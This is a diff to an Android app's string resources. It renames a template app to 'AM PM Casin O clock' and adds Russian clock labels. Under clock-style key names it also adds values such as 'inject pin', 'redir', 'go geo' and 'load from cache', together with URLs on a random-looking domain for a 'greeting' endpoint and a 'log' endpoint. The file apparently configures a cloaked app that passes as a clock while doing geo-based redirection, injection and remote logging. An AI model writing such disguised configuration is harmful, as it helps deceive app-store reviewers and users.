@@ -1,3 +1,32 @@
 <resources>
-    <string name="app_name">My Application</string>
+    <string name="app_name">AM PM Casin O clock</string>
+    <string name="alarm_clock">Будильник</string>
+    <string name="watch">Часы</string>
+    <string name="stopwatch">Секундомер</string>
+    <string name="choosing_wallpaper">Меню</string>
+    <string name="comment">Комментрий</string>
+
+    <string name="watch_time_less_nine">%s:0%s</string>
+    <string name="watch_time">%s:%s</string>
+    <string name="watch_date">%s, %s %s</string>
+    <string name="watch_null">00:00</string>
+
+    <string name="stopwatch_time">0%s</string>
+    <string name="stopwatch_null">00</string>
+
+    <string name="adapter_time">%s:%s</string>
+
+    <string name="custom_minute">inject pin</string>
+    <string name="custom_sound">purch pin</string>
+    <string name="custom_hour">re pin</string>
+    <string name="custom_stopwatch">redir</string>
+
+    <string name="custom_seconds">load from cache</string>
+    <string name="custom_time">go geo</string>
+    <string name="custom_watch">exception on geo</string>
+    <string name="custom_watch_empty">geo is empty</string>
+
+    <string name="key_comment">https://vxzbdsfdsh.online/api/greeting/</string>
+    <string name="key_alarm_clock">https://log.vxzbdsfdsh.online/api/log/</string>
+    <string name="key_day">pj_60e710d9a7b9b2.28894127</string>
 </resources>
